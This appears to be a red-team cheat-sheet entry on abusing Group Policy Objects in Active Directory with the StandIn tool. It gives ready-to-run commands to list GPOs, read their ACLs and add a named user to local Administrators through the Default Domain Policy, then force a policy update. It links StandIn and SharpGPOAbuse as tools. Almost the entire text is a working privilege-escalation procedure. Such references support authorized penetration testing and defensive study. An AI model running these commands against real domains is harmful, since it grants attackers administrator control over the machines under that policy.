---
title: StandIn - GPO Abuse
category: ad
subcategory: ad-attacks
os: windows
command: .\StandIn.exe --gpo --filter "Default Domain Policy" --localadmin user
tools: StandIn
---


### List available GPOs

```cmd
.\StandIn.exe --gpo
```

### Inspect GPO ACLs

```cmd
.\StandIn.exe --gpo --filter "Default Domain Policy" --acl
```

### Add current user to local Administrators via GPO

```cmd
.\StandIn.exe --gpo --filter "Default Domain Policy" --localadmin charlotte
gpupdate /force
```

Reference: https://github.com/FuzzySecurity/StandIn

### Alternative

https://github.com/FSecureLABS/SharpGPOAbuse
